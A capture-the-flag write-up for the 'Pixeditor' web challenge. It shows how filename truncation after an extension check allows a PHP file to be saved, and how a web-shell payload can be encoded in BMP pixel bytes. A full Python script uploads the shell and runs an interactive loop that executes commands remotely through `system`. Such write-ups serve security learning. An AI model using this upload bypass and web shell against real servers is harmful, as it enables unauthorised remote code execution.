# Pixeditor (Web)

In the task we get access to a web-based picture editor.
We can draw a small image by setting pixel colors and then save it on the server as JPG, PNG, BMP or GIF under given filename.

There is a check for the file extension when saving the file, however the name is truncated to 50 characters after the extension check.
So we can use name ending with `.png` to pass the check, but if the name is too long, this extension will be cut.
Using this trick we can save a `.php` file by using name in format `'x'*46+'.php.png`.

Now we would like to place some PHP code inside the file, but we can only draw some pixels.
Fortunately PHP interpreters are permissive, and they will execute anything which looks like valid PHP code.
So we can have some random bytes before and after PHP code in the file, and it will still work.

We need to paint a picture where bytes will create code we want.
The easiest option is to use BMP because pixels simply go into the file directly as BGR color values.
Web editor includes also alpha channel, so we actually have 32x32x4 bytes, and we want to skip every 4th byte, because it won't appear in the output file.
Also the bytes in BMP are inverted, because the web editor format is RGBA and BMP has BGR.

The solution is to split the payload `<?php $_GET['a']($_GET['b']); ?>` into 3-bytes long chunks, and place then in consecutive picture pixels inverted:

```python
import re
import requests
from crypto_commons.generic import chunk


def shell(url):
    while True:
        b = raw_input("> ")
        print(requests.get(url + "?a=system&b=" + b).text[3030:])


def pad(plain):
    missing = 3 - len(plain) % 3
    return plain + (" " * missing)


def create_shell(main_url):
    data = [1 for _ in range(32 * 32 * 4)]
    index = 0
    for c in chunk(pad("<?php $_GET['a']($_GET['b']); ?>"), 3):
        data[index + 2] = ord(c[0])  # R
        data[index + 1] = ord(c[1])  # G
        data[index] = ord(c[2])  # B
        index += 4
    url = main_url + "save.php"
    name = "A" * 46 + ".php"
    r = requests.post(url, data={"data": str(data), "name": name + ".JPG", "format": "BMP"})
    link = re.findall("<a href='(.*)'>Download", r.text)[0]
    return link


def main():
    main_url = "http://pixeditor.challs.malice.fr/"
    link = create_shell(main_url)
    print(main_url + link)
    shell(main_url + link)


main()
```

With such shell we can just find the flag in `/` and cat it to get `NDH{Msp4int.3x3>all>th3g1mp}`
